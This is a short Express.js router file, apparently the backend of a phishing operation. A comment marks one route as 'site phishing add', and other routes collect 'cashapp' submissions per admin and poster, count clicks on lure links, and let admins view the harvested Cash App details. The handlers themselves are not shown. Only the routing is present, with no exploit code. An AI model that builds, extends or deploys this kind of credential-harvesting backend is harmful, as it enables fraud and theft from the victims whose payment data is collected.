const express = require('express');
const router = express.Router();
const User = require('../models/User')
const auth = require('./routehandler')

router.post('/link/add', auth.link_add);

router.get('/link/get/:id', auth.link_get);////

router.post('/signup', auth.signup_post);///adda customer from shannon end

router.post('/login', auth.login_post);

router.post('/skip', auth.skip_code);

router.post('/admin/add', auth.poster_add);//admin user and pass add

router.post('/ad/:adminId/:posterId', auth.add_data);  ///site phishing add

router.get('/info/:username/:id/:admin', auth.info_get);

router.get('/all/poster/:id', auth.all_poster);

// router.post('/change/password/', auth.change_password);

router.delete('/delete/poster/:id', auth.delete_poster);

router.post('/add/newsite/update', auth.new_site_add_poster);

router.get('/get/poster/:id/:admin', auth.get_A_poster);////


router.get('/poster/details/:id/', auth.poster_details);

// router.get('/details/:id/', auth.poster_details);

router.post('/site/add/', auth.add_site); //add site to shannon

router.post('/admin/site/add/', auth.admin_add_site);//to add extra site to admin

router.post('/add/posterNumber/', auth.add_posterNumber);//add poster number

router.post('/edit/link/', auth.add_new_links);//edit links number

router.get('/:site/:adminId/:posterId', auth.site_exist);

router.get('/:adminId/:posterId', auth.click);///clicl find
router.get('/:adminId/', auth.click_for_admin);///clicl find

router.get('/link/get/:id/:admin', auth.link_details);

router.post('/change/password', auth.pass_change);

router.post('/cashapp/add/:adminId/:posterId',auth.cashapap_post)

router.post('/validity/update',auth.update_validity)

router.post('/links/reAdd',auth.links_add)   // if any mistake happens with links then add by this

router.get('/cash/app/details/admin/poster/:anyid',auth.get_deyails_cashapp)

router.get('/cash/app/details/admin/poster/hello/anyid/yes',auth.show_all)

router.post('/demo/save',auth.demo_add)  

module.exports = router;
